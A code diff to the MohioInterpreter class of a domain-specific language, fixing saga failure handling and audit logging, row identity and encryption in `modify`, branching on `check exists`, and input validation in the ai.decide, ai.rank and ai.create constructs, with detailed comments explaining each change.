+            # Counting rows and ignoring the column would answer a question nobody asked.
+            # BLIND INDEX: an equality on an encrypted field counts through its shadow column.
+            where = self._bidx_dict(db, table, where, node)
+            if _col:
+                cnt = len(self._rows_with_column(db.find_many(table, where or None), _col))
+            else:
+                cnt = db.count(table, where or None)
         except Exception as e:
             return self._handle_failure(handlers, ctx, str(e), operational_failure=True)
 
@@ -9548,6 +12827,38 @@ class MohioInterpreter:
             # ran on.success on a HIT, and neither on.success nor when/otherwise ever ran on a
             # miss, so a `when`/`otherwise` written on a `check X exists` block was silently
             # inert regardless of outcome. Consistent with retrieve/grab now.
+            # MIOQL-1 (2026-08-31): the ANSWER branches on `when empty` / `otherwise`, the
+            # same mechanism `check unique` below already uses and the one T1-OUTCOME-STRUCTURE
+            # ruled canonical. `when empty` is the ZERO-ROW case (nothing matched); `otherwise`
+            # is a hit. Before this there was no branching at all here -- only
+            # `_handle_success`, which ran `on.success` whichever way the answer came out, so
+            # the guide's signup example reported "taken" for EVERY email and an authorization
+            # gate written this way never denied. `on.success`/`on.failure` are now refused at
+            # compile time for this variant, so nothing silently misroutes.
+            # `when empty` -- the zero-row case, spelled the way every other query verb
+            # spells it. Handled here because `_handle_success` below evaluates a `when` against
+            # the BOUND VALUE, and `empty` is a keyword rather than a value to compare against.
+            when_empty = next(
+                (h for h in handlers
+                 if isinstance(h, CheckWhen)
+                 and type(getattr(h, 'value', None)).__name__ == 'DottedName'
+                 and list(getattr(getattr(h, 'value', None), 'parts', [])) == ['empty']
+                 and not ctx.exists('empty')), None)
+            if when_empty is not None:
+                if not found:
+                    return self._run_check_branch_body(when_empty.body, ctx, node.name)
+                otherwise = next((h for h in handlers
+                                  if isinstance(h, OtherwiseClause)), None)
+                if otherwise is not None:
+                    return self._run_check_branch_body(otherwise.body, ctx, node.name)
+                return MohioValue(found, 'boolean')
+            # No `when empty`: the OTHER supported shape is a condition on the bound boolean
+            # (`when hit is true` / `otherwise`), which _handle_success already evaluates
+            # correctly on either outcome. It is a real, tested form -- an earlier draft of
+            # this fix refused it, which broke test_guard_failopen_grab_checkexists and would
+            # have removed a working capability to fix a routing bug that lives elsewhere.
+            # The reported bug is closed by refusing on.success/on.failure at COMPILE time, so
+            # the only handlers that can reach _handle_success now are when/otherwise.
             self._handle_success(handlers, ctx)
             return MohioValue(found, 'boolean')
 
@@ -9563,7 +12874,9 @@ class MohioInterpreter:
             available = (cnt == 0)
             if node.name:
                 ctx.set(node.name, MohioValue(available, 'boolean'))
-            _run_success()
+            # No `_run_success()` here any more: `on.success` is refused at compile time for
+            # this variant (MIOQL-2), so the call could only ever be a no-op, and a no-op that
+            # looks like it runs a handler is the shape this fix exists to remove.
             when_empty = None
             for h in handlers:
                 if isinstance(h, CheckWhen):
@@ -9688,7 +13001,28 @@ class MohioInterpreter:
             for step in node.steps:
                 try:
                     self._exec_block(step.body, saga_ctx)
-                except (_GiveBack, _Raise):
+                except _GiveBack:
+                    # A HANDLER UNWIND IS NOT A STEP FAILURE -- the same ruling the transaction
+                    # block makes, so the two constructs stay consistent. `give back` says
+                    # "answer the caller now"; it does not say "this step went wrong".
+                    #
+                    # Measured over real HTTP before this: `give back [201] "placed"` in the
+                    # second step of a two-step saga answered 200 with a saga status object
+                    # instead of the 201 the author wrote, reported COMPENSATED, and ran the
+                    # first step's compensate -- while the row it claimed to undo was still in
+                    # the table, because that compensate was a `show`. The caller got a
+                    # compensation report for work that had actually succeeded.
+                    #
+                    # So the step COMPLETES: its on.success runs and it registers for rollback,
+                    # exactly as a normal completion does. Then the give-back travels on and
+                    # answers. The remaining steps do not run, which is correct -- the author
+                    # said answer now.
+                    self._run_step_handlers(step, OnSuccess, saga_ctx)
+                    outcomes.append({'step': step.name, 'outcome': 'completed'})
+                    if not step.best_effort:
+                        completed.append(step)
+                    raise
+                except _Raise:
                     # Local reaction first: the failing step's own on.failure runs now,
                     # before the saga decides anything.
                     self._run_step_handlers(step, OnFailure, saga_ctx)
@@ -9728,9 +13062,99 @@ class MohioInterpreter:
                 import sys as _sys
                 _failed_step = next((o['step'] for o in outcomes if o.get('outcome') == 'failed'),
                                      '?')
+                # COUNT OUTCOMES, NOT ATTEMPTS. This said `len(completed)`, which is the set of
+                # steps REGISTERED for rollback -- what was attempted, not what worked. So a
+                # FAILED_COMPENSATION, the one status that exists precisely because a rollback
+                # did NOT work, still announced every step as compensated. An operator reading
+                # that line on a failure path was being told the system unwound cleanly when it
+                # had not. The uncompensated steps are named too, because on this path they are
+                # the whole point: they are the rows still sitting there.
+                _done = [o['step'] for o in outcomes if o.get('outcome') == 'compensated']
+                _stuck = [o['step'] for o in outcomes
+                          if o.get('outcome') in ('compensation_failed', 'no_compensation')]
+                _tail = (f", {len(_stuck)} NOT undone: " + ", ".join(f"'{x}'" for x in _stuck)
+                         if _stuck else "")
                 print(f"  [saga] '{getattr(node, 'name', '?')}' did not commit -- {status} "
-                      f"(step '{_failed_step}' failed, {len(completed)} step(s) compensated)",
+                      f"(step '{_failed_step}' failed, {len(_done)} step(s) compensated{_tail})",
                       file=_sys.stderr)
+                # THE REVERSAL REACHES THE TRAIL, not only stderr. A failed-and-rolled-back saga
+                # left nothing behind but the ordinary `save` rows of the steps that ran, so
+                # afterwards a transaction that was undone looked exactly like unrelated writes:
+                # no saga, no failure, no compensation, and no link between them. The structured
+                # account existed and went to stdout, where no compliance reader will ever see
+                # it.
+                #
+                # `operation_audit_log` rather than `security_audit_log`: a compensation is an
+                # operational reversal, not an access denial, and it belongs beside the other
+                # operational records rather than among the refusals. Same `_audit_event` call,
+                # so it is stamped and hash-chained identically.
+                _sevt = self._audit_event('operation_audit_log', {
+                    'event': 'saga_compensated',
+                    'reason': ('compensation_failed'
+                               if status == 'FAILED_COMPENSATION' else 'step_failed'),
+                    'saga': str(getattr(node, 'name', '?')),
+                    'status': status,
+                    'failed_step': str(_failed_step),
+                    'steps_compensated': len(_done),
+                    'steps_not_undone': list(_stuck),
+                }, ctx)
+                self._audit_logs.setdefault('operation_audit_log', []).append(_sevt)
+            # A FAILED SAGA STOPS THE HANDLER when nothing in the program handles it.
+            #
+            # Measured through a real request before the fix: a saga whose second step failed
+            # compensated correctly, printed "did not commit", and the handler then continued to
+            # `give back 201 "order placed"` -- byte-identical to the successful run, over a
+            # table with nothing in it. The construct whose entire purpose is partial failure
+            # was the one reporting success on it.
+            #
+            # NOT COVERED BY THE EARLIER FIX, checked rather than assumed: that one made a
+            # `give back` INSIDE a task carrying a failed saga propagate its failure status
+            # instead of being swallowed at the call boundary (_exec_CallBlock). This is the
+            # other half, the handler continuing AFTER `saga: done`, with no task boundary.
+            #
+            # TWO WAYS TO HANDLE A FAILED SAGA, and both are honoured because both are real:
+            #
+            #   `on.failure` inside the saga    the new one, following the ai.decide precedent
+            #                                   that a governed construct declares what happens
+            #                                   when it cannot do its job.
+            #   reading `<saga>.status`         the one that already shipped, with three tests
+            #                                   behind it. A saga binds its status to its name
+            #                                   so a caller can `check s.status / when
+            #                                   "COMPENSATED"`. Raising over the top of that
+            #                                   would refuse working programs, which is the
+            #                                   mirror of the bug, not a fix for it.
+            #
+            # The refusal is for the case with NO answer at all: no handler, and nobody ever
+            # looks. Absent explicit handling, fail safe, not fall through.
+            if status in ('COMPENSATED', 'FAILED_COMPENSATION'):
+                _consulted = str(getattr(node, 'name', '') or '') in getattr(
+                    self, '_saga_names_read', set())
+                _handler = next((b for b in (getattr(node, 'body', None) or [])
+                                 if isinstance(b, OnFailure)), None)
+                if _handler is not None:
+                    # The handler's own `give back` propagates, which is how a saga declares its
+                    # failure response. If it gives back nothing, the raise below still fires:
+                    # a handler that decides nothing has not decided anything.
+                    self._exec_block(_handler.body, ctx)
+                _followed = str(getattr(node, 'name', '') or '') in getattr(
+                    self, '_sagas_with_code_after', set())
+                if _handler is not None or (_followed and not _consulted):
+                    _undone = [o['step'] for o in outcomes
+                               if o.get('outcome') in ('compensation_failed', 'no_compensation')]
+                    raise _Raise(
+                        error_name='saga_did_not_commit',
+                        message=(
+                            f"saga '{getattr(node, 'name', '?')}' did not commit ({status}), so "
+                            f"the work it describes did not happen." +
+                            (f" {len(_undone)} step(s) could NOT be undone: "
+                             f"{', '.join(_undone)}." if _undone else "")),
+                        line=getattr(node, 'line', None),
+                        hint=("Declare `on.failure` inside the saga and give back the response "
+                              "a failed saga should send, or read its status "
+                              "(`check <saga>.status`) and branch. Without either the request "
+                              "stops here rather than continuing to a success response the "
+                              "saga did not earn."))
+
             saga_result = MohioValue({'status': status, 'steps': outcomes}, 'shape')
             # Bind the status object to the saga's name in the ENCLOSING scope, the
             # same way find/retrieve/grab bind their result. A caller then reads
@@ -9835,8 +13259,35 @@ class MohioInterpreter:
             if t in _num:
                 raw_py = raw.to_python() if isinstance(raw, MohioValue) else raw
                 num, kind = _mohio_coerce_number(raw_py, _num[t], None, pname)
-                return num if isinstance(num, MohioValue) else MohioValue(num, kind)
-            return raw
+                coerced = num if isinstance(num, MohioValue) else MohioValue(num, kind)
+                return _classify_bound(p, coerced)
+            # A non-numeric param has no coercion to run at all: text, shape and untyped
+            # params take the value exactly as it arrived.
+            return _classify_bound(p, raw)
+
+        def _classify_bound(p, bound):
+            """`take ssn as text [phi]` classifies what ARRIVES.
+
+            A tag on a take param is the same rule as a tag on a field, applied where a value
+            enters instead of where it is read: classification is bound to the value, not to
+            the name it came through. Without this the tag would parse, sit on the param, and
+            protect nothing -- the shape of decorative vocabulary this slot exists to prevent.
+
+            COPIED BEFORE CLASSIFYING. The argument can be the caller's own MohioValue, and
+            marking it in place would silently classify the caller's variable as a side effect
+            of passing it. The tag applies to what the task received.
+            """
+            if not isinstance(bound, MohioValue):
+                return bound
+            for m in (getattr(p, 'modifiers', None) or []):
+                if str(getattr(m, 'modifier_type', '')) != 'tag':
+                    continue
+                cls = str(getattr(m, 'value', '') or '').lower()
+                if cls in ('phi', 'pci'):
+                    bound = _copy.copy(bound)
+                    bound.data_class = cls
+                    break
+            return bound
 
         # Named args block form
         if node.args:
@@ -9960,7 +13411,7 @@ class MohioInterpreter:
         # not allowed in a certified sector (financial/healthcare) where baselines are
         # cemented -- a raw INSERT must not be able to slip a card_cvv or PHI past the
         # guardrails. Fail loud instead.
-        _sec = getattr(ctx, '_sector', None)
+        _sec = scoped_attr(ctx, '_sector')
         if _sec and str(_sec).split('.')[0].strip().lower() in ('financial', 'healthcare'):
             raise _Raise(
                 error_name='sql.blocked_in_certified_sector',
@@ -10196,7 +13647,36 @@ class MohioInterpreter:
             if db is None: return _early
         else:
             db = None
-        table = self._resolve_source(node.collection, ctx) if is_db else None
+        table = self._resolve_write_target(node.collection, ctx, 'modify') if is_db else None
+        # `modify` filters IN MEMORY (`_eval_condition` per row, below), not in SQL, so its rows
+        # have to be readable before the `where` can mean anything. `_random_collection` returns
+        # them exactly as stored, which for a tagged field is ciphertext -- so
+        # `modify ... where ssn is "1111"` compared "1111" against `enc:v1:...` and matched
+        # nothing, silently. Decrypt here, once, so both the filter and the `apply` body see the
+        # real value. The write path re-encrypts on the way back out.
+        if is_db:
+            rows = [self._decrypt_row(r) if isinstance(r, dict) else r for r in rows]
+        # A modify naming NO field to change is structurally impossible work, the direct sibling
+        # of `update_without_fields` above. Before this the per-row `if not changes: continue`
+        # below skipped every row in silence: exit 0, nothing written, nothing printed, and no
+        # handler or binding to inspect -- a completely invisible no-op.
+        if not (node.body or []):
+            raise _Raise(error_name='modify_without_fields',
+                message="modify names no field to change, so there is nothing to write.",
+                line=getattr(node, 'line', None),
+                hint="Add an `apply <name>` body with at least one `field value` line, "
+                     "e.g. `apply item` / `name \"CHANGED\"` / `apply: done`.")
+        # ROW IDENTITY comes from the DATABASE -- the primary key, else the narrowest unique
+        # index -- exactly as `_audit_identity` and the upsert already ask for it. Never a copy
+        # of that knowledge maintained here, and never "match on all the columns".
+        # Only SQLite and Postgres answer this today; MySQLRuntime and MongoRuntime do not define
+        # it at all (verified: `table_identity` exists on DbRuntime and PostgresRuntime only, and
+        # the four runtimes do not inherit from one another). That gap is reported separately
+        # rather than papered over -- see the refusal below.
+        _ident = ()
+        _has_identity_source = is_db and db is not None and hasattr(db, 'table_identity')
+        if _has_identity_source:
+            _ident = tuple(db.table_identity(table) or ())
         count = 0
         for row in rows:
             if not isinstance(row, dict):
@@ -10230,16 +13710,81 @@ class MohioInterpreter:
             if not changes:
                 continue
             if is_db and db is not None:
-                # No portable row id is exposed, so match the row on its ORIGINAL
-                # field values. Correct for unique rows; identical duplicate rows
-                # are updated together (documented edge case).
-                match = {k: (v.to_python() if isinstance(v, MohioValue) else v)
-                         for k, v in row.items()}
-                if match:
-                    db.update_multi(table, changes, match)
+                # A row is addressed by its IDENTITY, and the count is whatever the database
+                # says it changed.
+                #
+                # Both halves used to be wrong, and they compounded. The row was matched on ALL
+                # ITS COLUMNS, so any column holding NULL made the generated `WHERE col = NULL`
+                # match nothing (NULL = NULL is false in SQL) and the write silently did not
+                # happen; identical duplicate rows were all rewritten together for the same
+                # reason. Then `count += 1` ran unconditionally -- counting ATTEMPTS, not
+                # changes -- and `update_multi`'s real return value was thrown away. A modify
+                # that changed 1 row reported 2 AND AUDITED 2, so under a sector the compliance
+                # record stated a number that never happened. This is the surviving sibling of
+                # T0-1 (modify writing every row on a compound WHERE); the shared root was that
+                # `modify` had no reliable row identity.
+                if not _has_identity_source:
+                    # A DIFFERENT situation from "this table declares no identity", and it must
+                    # not share that message. This backend cannot be ASKED what identifies a row,
+                    # so modify has no safe way to address one. Refusing loudly is deliberately
+                    # chosen over two worse options: falling back to all-columns would re-ship the
+                    # exact bug this change removes (silent misses on NULL, duplicate rows written
+                    # together), and guessing `id` would be a silent wrong write on a table keyed
+                    # some other way. Backlog: T1-TABLE-IDENTITY-MYSQL-MONGO.
+                    raise _Raise(error_name='modify_identity_unavailable',
+                        message=(f"modify cannot change rows in '{table}': this database backend "
+                                 f"cannot say which columns identify a row, so there is no safe "
+                                 f"way to address one row rather than another. This is a missing "
+                                 f"piece of the backend, not a mistake in your code."),
+                        line=getattr(node, 'line', None),
+                        hint="modify is supported on SQLite and Postgres today. Use `update ... "
+                             "match <field> to <value>`, which addresses rows by the condition "
+                             "you write, on any backend.")
+                if not _ident:
+                    raise _Raise(error_name='modify_no_row_identity',
+                        message=(f"modify cannot safely change rows in '{table}': the table "
+                                 f"declares no primary key and no unique index, so there is no "
+                                 f"way to address one row rather than another."),
+                        line=getattr(node, 'line', None),
+                        hint="Give the table a primary key or a unique index. (Matching on every "
+                             "column instead is what this refusal replaces -- it silently missed "
+                             "any row holding a NULL and rewrote duplicate rows together.)")
+                match = {c: (row.get(c).to_python()
+                             if isinstance(row.get(c), MohioValue) else row.get(c))
+                         for c in _ident}
+                # The rows were decrypted above, so an identity column that is itself tagged
+                # now holds plaintext while the table holds ciphertext. Route it through the
+                # shadow column so the row is still addressable.
+                match = self._bidx_dict(db, table, match, node)
+                _null_cols = [c for c, v in match.items() if v is None]
+                if _null_cols:
+                    raise _Raise(error_name='modify_identity_null',
+                        message=(f"modify cannot address a row in '{table}': its identity column"
+                                 f"{'s' if len(_null_cols) > 1 else ''} "
+                                 f"{', '.join(_null_cols)} hold no value, so the row cannot be "
+                                 f"told apart from any other."),
+                        line=getattr(node, 'line', None),
+                        hint="An identity column must always hold a value. Refusing rather than "
+                             "writing to whichever row happens to match.")
+                # Encrypt tagged fields BEFORE the write -- the same call `save` (9852/9873),
+                # `save_or_update`, `save_all` and `update` already make, at the same seam. Without
+                # it a [phi]/[pii]/[pci] field written by `modify` landed in the DATABASE AS
+                # PLAINTEXT while its siblings wrote `enc:v1:...`, and the audit recorded a normal
+                # change with no sign the value went in the clear. Only on the db branch: the
+                # in-memory branch below persists nothing, and encrypting there would corrupt the
+                # value the program itself reads back.
+                changes = self._guard_write(table, changes, node, 'modify')
+                # BUILD NOTE 2: same as `update` -- `update_multi` never ensures the schema,
+                # so the shadow column has to be created here or modify writes to a column
+                # that does not exist.
+                try: db.ensure_table(table, list(changes.keys()))
+                except Exception: pass
+                _changed = db.update_multi(table, changes, match)
+                count += int(_changed or 0)
             else:
+                # In-memory: the dict is mutated here and now, so this row genuinely changed.
                 row.update(changes)
-            count += 1
+                count += 1
         if is_db and table:
             # A data change that cannot be audited must NOT silently succeed -- same principle as
             # cm.purge. Audit like the fail-loud siblings (save/remove): NO try/except swallow, so an
@@ -10457,18 +14002,14 @@ class MohioInterpreter:
         for a genuine invocation (an explicit `ai.decide NAME` re-invoke), always with the
         caller's real, in-scope context. See _exec_AiDecideBlock's docstring for why this is
         a separate method from the declaration dispatch."""
-        # 1. Collect weigh inputs
-        weigh  = next((b for b in node.body if isinstance(b, WeighClause)), None)
-        inputs = {}
-        if weigh:
-            for dotted in weigh.inputs:
-                key = '.'.join(dotted.parts) if isinstance(dotted, DottedName) else str(dotted)
-                val = ctx.get_dotted(dotted.parts) if isinstance(dotted, DottedName) else ctx.get(str(dotted))
-                inputs[key] = val
+        # 1. Collect weigh inputs, through the one shared helper every ai.* verb uses. This
+        #    read used to be its own `ctx.get_dotted` copy, which answered for an undeclared
+        #    name instead of refusing; see _collect_weigh_inputs for what that cost.
+        inputs = self._collect_weigh_inputs(node, ctx)
 
         # Strong enforcement: under an active sector, ai.decide MUST audit (compliance feature).
-        _sector_active = getattr(ctx, '_sector', None) not in (None, '', 'none') \
-                         or bool(getattr(ctx, '_sector_compliance', None))
+        _sector_active = scoped_attr(ctx, '_sector') not in (None, '', 'none') \
+                         or bool(scoped_attr(ctx, '_sector_compliance'))
         if _sector_active and not any(isinstance(b, AiAuditStmt) for b in node.body):
             raise _Raise(error_name='audit_required',
                 message=f"ai.decide '{node.name}' under an active sector must declare 'ai.audit to <log>'.",
@@ -10489,7 +14030,7 @@ class MohioInterpreter:
                 break
 
         # Sector floor: a regulated decision cannot be gated below its profile minimum.
-        _profile = getattr(ctx, '_sector_profile', None)
+        _profile = scoped_attr(ctx, '_sector_profile')
         if _profile is not None:
             try:
                 _floor = _profile.get_confidence_floor(node.name)
@@ -10590,6 +14131,28 @@ class MohioInterpreter:
         # on.failure is NOT fired here: 'not confident' is the sole below-threshold handler in
         # ai.decide. on.failure/on.success remain available as general handlers elsewhere.
 
+        # 5b. `otherwise` -- the confident path. The AI blocks took their handlers from the
+        # shared `result_handlers` rule on 2026-09-02, which is what made `otherwise` writable
+        # on an AI block at all. Writable and not wired is the silent no-op this project treats
+        # as its worst class, and it was measured as exactly that before this branch existed:
+        # the grammar accepted the block and nothing ever ran it.
+        # The MEANING is derived from result_handlers' own design spec rather than invented for
+        # the AI case: a block has a STATE stage (on.failure / on.success) and a CONDITION stage
+        # (when / otherwise) that runs post-result on the non-failure path. The AI condition is
+        # confidence, so `otherwise` is the path where the gate was cleared -- the exact
+        # complement of `not confident`, and never both in one run.
+        else:
+            ow = next((b for b in node.body
+                       if type(b).__name__ in ('OtherwiseClause', 'Otherwise')), None)
+            if ow is not None:
+                try:
+                    self._exec_block(getattr(ow, 'body', []) or [], ctx)
+                except _GiveBack as gb:
+                    # Symmetric with `not confident` above: a `give back` here is the
+                    # decision's result on the confident path, not a return from the
+                    # surrounding handler.
+                    decision.result = gb.value
+
         # 6. Bind result
         # Register the full decision object (confidence, model, inputs, explanation)
         # by name so ai.explain can look it up later. ctx only gets the result value.
@@ -10617,17 +14180,22 @@ class MohioInterpreter:
         """
         name = str(field_name)
         # Highest-sensitivity wins if a field is multiply tagged.
-        if name in (self._phi_fields or set()):
+        if self.classification.has(name, 'phi'):
             return "[phi]"
-        if name in (self._pci_fields or set()):
+        # THROUGH THE RESOLVER, like every other classification read. This asked the bare-name
+        # set, which stopped carrying table-owned fields when classification moved to qualified
+        # identity, so a [pci] field declared inside a table audited as "[encrypted]" instead of
+        # "[pci]". An audit that under-reports what a decision was made about is the same class
+        # of false statement as one that over-reports.
+        if self.classification.has(name, 'pci'):
             return "[pci]"
         if name in (getattr(self, '_field_purposes', {}) or {}):
             return "[pii]"
-        if name in (self._encrypted_fields or set()):
+        if self.classification.has(name, 'encrypted'):
             return "[encrypted]"
         # Sector profile classifications, when a profile is active.
         try:
-            prof = getattr(ctx, '_sector_profile', None) if ctx is not None else None
+            prof = scoped_attr(ctx, '_sector_profile')
             if prof is not None and hasattr(prof, 'get_field_classifications'):
                 classes = prof.get_field_classifications(name)
                 if classes:
@@ -10655,7 +14223,7 @@ class MohioInterpreter:
         ts = _dt.datetime.utcnow().isoformat() + 'Z'
 
         # Sector profile — bound automatically from interpreter state
-        sector = getattr(self, '_sector', None) or getattr(ctx, '_sector', None) or 'none'
+        sector = getattr(self, '_sector', None) or scoped_attr(ctx, '_sector') or 'none'
 
         # Session context — member_id if available, session_id
         session_id = None
@@ -10749,22 +14317,74 @@ class MohioInterpreter:
         log = self._audit_logs.setdefault(node.log_name, AuditLog(node.log_name))
         log.record({'event': 'manual_audit'})
 
-    def _ai_shared_inputs(self, node, ctx):
-        """Collect `weigh` inputs and the prompt options shared by the ai.* blocks that
-        reuse ai_decide_body (compare, respond)."""
+    def _collect_weigh_inputs(self, node, ctx):
+        """The weighed inputs of an ai.* block, evaluated the ONE way, for every ai.* verb.
+
+        WHY THIS IS SHARED RATHER THAN WRITTEN TWICE. It used to be written twice, and the two
+        copies disagreed. ai.compare and ai.respond evaluated a weigh input with `self._eval`,
+        which RAISES when the name is not declared. ai.decide read it with `ctx.get_dotted`,
+        which returns a value for a miss, so `weigh nosuchthing.field` did three things in
+        order: the input silently vanished from the decision, the decision was made anyway on
+        what was left, and the audit record was written listing that input as weighed.
+
+        Measured before the fix, through a real request:
+
+            ai.decide  weigh nosuchthing.field  -> 200, inputs={'nosuchthing.field': None}
+            ai.compare weigh nosuchthing.field  -> 500, undeclared_variable
+
+        The audit record is the part that makes this worse than an ordinary silent default. A
+        governed decision that drops an input is wrong; a governed decision that drops an input
+        and then RECORDS having considered it is a false statement pointing toward compliance,
+        and it is the auditor rather than the developer who finds out.
+        """
         inputs = {}
         weigh = next((b for b in node.body if isinstance(b, WeighClause)), None)
         if weigh:
             for dotted in weigh.inputs:
                 key = '.'.join(dotted.parts) if hasattr(dotted, 'parts') else str(dotted)
-                inputs[key] = self._eval(dotted, ctx)
+                val = self._eval(dotted, ctx)
+                # A GOVERNED DECISION CANNOT WEIGH NOTHING, and this is the case `_eval` cannot
+                # refuse on its own. Reading a member off a value that HAS no members answers
+                # None instead of raising: `hold claim = "x"` then `weigh claim.amt` handed the
+                # model None, the decision was made without it, and the audit recorded the input
+                # as considered. Measured, and it is narrow -- `claim.amt` on a real record
+                # returns 4200, and `claim.nosuch` on a real record already raises. The one hole
+                # is a dotted read whose BASE is not something that can hold members.
+                parts = list(getattr(dotted, 'parts', ()) or ())
+                if len(parts) > 1 and (val is None or (
+                        isinstance(val, MohioValue) and val.to_python() is None)):
+                    base_val = ctx.get(parts[0])
+                    base_py = (base_val.to_python()
+                               if isinstance(base_val, MohioValue) else base_val)
+                    if not isinstance(base_py, (dict, list)):
+                        raise _Raise(
+                            error_name='weigh_not_readable',
+                            message=(
+                                f"`weigh {key}` reads `{parts[-1]}` from `{parts[0]}`, and "
+                                f"`{parts[0]}` is {type(base_py).__name__ if base_py is not None else 'not set'}, "
+                                f"which has no `{parts[-1]}` to read."),
+                            line=getattr(node, 'line', None),
+                            hint=(f"Weigh a value the decision can actually read. A governed "
+                                  f"decision that weighs nothing still records the input as "
+                                  f"considered, so this refuses rather than deciding without "
+                                  f"it."))
+                inputs[key] = val
+        return inputs
+
+    def _ai_shared_inputs(self, node, ctx):
+        """Collect `weigh` inputs and the prompt options shared by the ai.* blocks that
+        reuse ai_decide_body (compare, respond)."""
+        inputs = self._collect_weigh_inputs(node, ctx)
         kwargs = {'inputs': inputs, 'return_type': node.return_type or 'text'}
         if getattr(node, 'goal', ''):
             kwargs['system_prompt'] = self._interpolate(node.goal, ctx)
         if getattr(node, 'persona', ''):
             kwargs['persona'] = self._interpolate(node.persona, ctx)
         if getattr(node, 'context', ''):
-            kwargs['context'] = self._interpolate(node.context, ctx)
+            # Was `_interpolate(node.context, ...)`, which only ever saw a string -- a
+            # dotted context had already been flattened to "" by the transformer and was
+            # silently dropped (Q99). `_prompt_text` handles both shapes.
+            kwargs['context'] = self._prompt_text(node.context, ctx)
         if getattr(node, 'temperature', None) is not None:
             t = self._eval(node.temperature, ctx)
             kwargs['temperature'] = t.to_python() if isinstance(t, MohioValue) else t
@@ -10976,18 +14596,34 @@ class MohioInterpreter:
         # weight wins. `default` is the no-match fallback. Confidence is the
         # winner's share of the matched weight; below the floor, `not confident`
         # runs and its `give back` becomes the winner.
-        def _num(v, fallback):
-            try:
-                x = self._eval(v, ctx) if v is not None else None
-                x = x.to_python() if hasattr(x, 'to_python') else x
-                return float(x)
-            except Exception:
+        def _num(v, fallback, slot):
+            """A weight or a confidence floor. An ABSENT one takes the fallback; a WRITTEN one
+            that will not evaluate refuses.
+
+            The difference is the whole point, and it used to be collapsed. `option "b" weight 2`
+            and `option "b" weight nosuchthing` both reached this function, and a bare except
+            turned the second into weight 1.0: the option stayed in the ranking, carrying a
+            number nobody wrote, and the ranking came out with a confident winner chosen partly
+            on a typo. An omitted weight is a real default and keeps it; a weight that was
+            written and cannot be read is a mistake and says so.
+            """
+            if v is None:
                 return fallback
+            x = self._eval(v, ctx)
+            x = x.to_python() if hasattr(x, 'to_python') else x
+            try:
+                return float(x)
+            except (TypeError, ValueError):
+                raise _Raise(
+                    error_name='ai_rank_not_a_number',
+                    message=(f"ai.rank '{node.name}': {slot} is {x!r}, which is not a number."),
+                    line=getattr(node, 'line', None),
+                    hint=f"A {slot} has to be a number, for example `weight 2`.")
 
         matched = []          # (weight, MohioValue)
         default_val = None
         for opt in node.options:
-            w = _num(opt.weight, 1.0) if opt.weight is not None else 1.0
+            w = _num(opt.weight, 1.0, 'weight')
             if opt.is_default:
                 default_val = self._eval(opt.value, ctx)
                 continue
@@ -11004,7 +14640,7 @@ class MohioInterpreter:
         else:
             winner, confidence = MohioValue(None, 'text'), 0.0
 
-        threshold = _num(node.confidence, None) if node.confidence is not None else None
+        threshold = _num(node.confidence, None, 'confidence floor')
         fell_back = False
         if threshold is not None and confidence < threshold and node.not_confident is not None:
             fell_back = True
@@ -11123,12 +14759,23 @@ class MohioInterpreter:
                 src_name = getattr(node, 'source', '') or ''
                 attrs = getattr(node, 'attrs', {}) or {}
                 if src_name or attrs:
-                    try:
-                        src_val = ctx.get(src_name) if src_name else None
-                    except Exception:
-                        src_val = None
-                    if src_val is None and src_name:
-                        src_val = src_name
+                    # `from SOURCE` NAMES A VALUE. The grammar says so (`(FROM dotted_name)?`,
+                    # a reference, not free text), and every test of this form passes a declared
+                    # variable. The old reading fell back to using the NAME ITSELF as the
+                    # source text when it did not resolve, so `ai.create blurb from custmer`
+                    # generated confidently from the six characters of the typo and reported
+                    # success. A generator given the wrong source does not fail, it invents,
+                    # which is why this one has to refuse at the name rather than downstream.
+                    src_val = ctx.get(src_name) if src_name else None
+                    if src_name and not ctx.is_declared(src_name):
+                        raise _Raise(
+                            error_name='undeclared_variable',
+                            message=(f"ai.create '{getattr(node, 'name', '') or alias}' reads "
+                                     f"from `{src_name}`, and nothing declares `{src_name}`."),
+                            line=getattr(node, 'line', None),
+                            hint=(f"Declare it before this block (`{src_name} <value>`), or name "
+                                  f"the value you meant. `from` names a value to build from, "
+                                  f"not the topic to write about: put the topic in `goal`."))
                     if isinstance(src_val, MohioValue):
                         src_val = src_val.to_python()
                     hints = "; ".join(f"{k}={itp(str(v))}" for k, v in attrs.items() if v)
@@ -11231,6 +14878,18 @@ class MohioInterpreter:
                 if node.always:
                     self._exec_block(node.always.body, ctx)
                 raise
+            except (_Jump, _Stop, _Skip):
+                # CONTROL FLOW, never an error -- same treatment `_GiveBack` and `_Halt` already
+                # get above, and the same re-raise `_exec_RetrieveBlock` already does for
+                # `_Stop`/`_Skip`. Without this they fell to the bare `except Exception` below
+                # and were converted into a fabricated `_Raise` whose message is EMPTY (none of
+                # the three carries one), so `jump to "/login"` inside a `try` fired the block's
+                # `on.failure` and execution continued with no redirect -- silently breaking the
+                # canonical redirect-to-login pattern. `stop` inside `repeat each / try` had the
+                # matching shape: on.failure every iteration and the loop never ended.
+                if node.always:
+                    self._exec_block(node.always.body, ctx)
+                raise
             except _Raise as r:
                 error = r
             except Exception as e:
@@ -11242,17 +14901,20 @@ class MohioInterpreter:
 
         if error:
             handled = False
-            # catch is the canonical try error handler; on.failure is the
-            # data-op style. Either runs the error path with `error` in scope.
-            for handler in (node.catch, node.on_failure):
-                if handler is not None:
-                    child = ctx.child()
-                    child.set('error', MohioValue({
-                        'message': str(error.message),
-                        'name': error.error_name,
-                    }))
-                    result = self._exec_block(handler.body, child)
-                    handled = True
+            # `on.failure` is the one error handler. This used to loop over
+            # `(node.catch, node.on_failure)`, which ran BOTH when a block declared both --
+            # an error path executed twice, silently. `catch` is retired as of 2026-08-27
+            # (it had drifted into a redundant alias for `on.failure`), so it can no longer
+            # reach here at all and the double-fire is closed with it.
+            handler = node.on_failure
+            if handler is not None:
+                child = ctx.child()
+                child.set('error', MohioValue({
+                    'message': str(error.message),
+                    'name': error.error_name,
+                }))
+                result = self._exec_block(handler.body, child)
+                handled = True
             if not handled:
                 if node.always:
                     self._exec_block(node.always.body, ctx)
@@ -11305,76 +14967,120 @@ class MohioInterpreter:
                     "Tracked for a future release.")
 
         # 2. Route the current request: pages (GET) first, then nested listeners.
-        req = getattr(ctx, '_current_request', None)
+        req = scoped_attr(ctx, '_current_request')
         if not req:
             # No request -- the journey was pure scope setup (e.g. run(request=None)).
             if self._debug_active(ctx):
                 self._debug_write(ctx, '\nCompleted: success')
             return None
 
